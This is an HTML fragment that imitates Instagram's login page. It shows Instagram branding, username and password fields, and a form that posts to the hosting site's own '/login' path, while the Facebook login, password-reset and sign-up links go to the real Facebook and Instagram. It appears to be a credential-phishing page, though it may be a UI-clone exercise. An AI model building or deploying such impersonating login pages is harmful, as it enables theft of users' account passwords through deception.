<body>
    <div id="photo">
        <img src="/images/login-page/screenshot1.png" class="blink" alt="feed" id="main-img" >
        <img src="/images/login-page/new.png" alt="feed" id="main-img2" >
        <img src="/images/login-page/copy.png" alt="template" width="390" height="590" id="template">
        <img src="/images/login-page/copy2.png" alt="template" width="600" height="610" id="template2">
        <!-- <img src="/images/login-page/screenshot2.png" alt="Screenshot 2"> -->
        <img id="img2" src="/images/login-page/image.png" alt="Image">
    </div>

    <form method="post" action="/login">
        <div id="content" class="thin-border">
            <img id="insta" src="/images/login-page/insta.png" alt="insta-img">
            <input id="input" type="text" class="input" name="username" autocomplete="off" placeholder="Phone number, username, or email" required>
            <br>
            <input id="password" type="password" class="input" name="password" placeholder="Password" required>
            <br>
            <button type="submit" id="login-btn">Log in</button>
            
            <p id="or">OR</p>
            <div id="both">
                <i id="facebook-logo" class="fa-brands fa-facebook"></i>
                <a href="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignupviafb%252F%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bprofile%2Blinking%26state%3DATmtalEVtfksrlNeku-bAS5y7CW36lvMyFPNDj4ze8O0eT4IO992wo7Jf5tMv0GBUsMacmaVR5-e6BqiIvYnPJnMvxWfZTaq0hzNBL2qkoszgAvtLDtr4SMfqVsvWYYQaFDD_yi-3RMwLz3O5HqUGRkYTXoxi6gqT_v6uECGP_vNvgR9Q3VMddjtbiTdsDRirIMCgIOtGNM4D-Kl-m23xFWetGV6XSSD2FOYueeO49h2omI12TPkmUbSzlEwF1lyeZUH" id="facebook-login">Log in with Facebook</a>
            </div>

            <a href="https://www.instagram.com/accounts/password/reset/" id="forgot-password">Forgot password?</a>

        </div>

        <div id="content2">
            <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/" id="signup">Sign Up</a></p>
        </div>

    </form>
    
</body>


